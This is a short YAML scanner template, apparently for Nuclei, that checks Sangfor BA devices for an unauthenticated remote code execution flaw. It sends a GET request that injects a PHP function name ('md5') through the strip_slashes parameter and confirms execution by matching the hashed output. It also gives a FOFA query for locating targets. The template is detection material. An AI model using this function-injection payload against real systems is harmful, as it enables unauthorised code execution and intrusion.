id: sangfor-ba-rce
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: 'Sangfor products allow remote unauthenticated users to cause the product
    to execute arbitrary commands.

    '
  metadata:
    fofa-query: app="sangfor"
    verified: true
  name: Sangfor BA - Remote Code Execution
  reference:
  - https://mobile.twitter.com/sec715/status/1406886851072253953
  severity: critical
  tags: rce,sangfor
requests:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5("{{randstr}}")}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
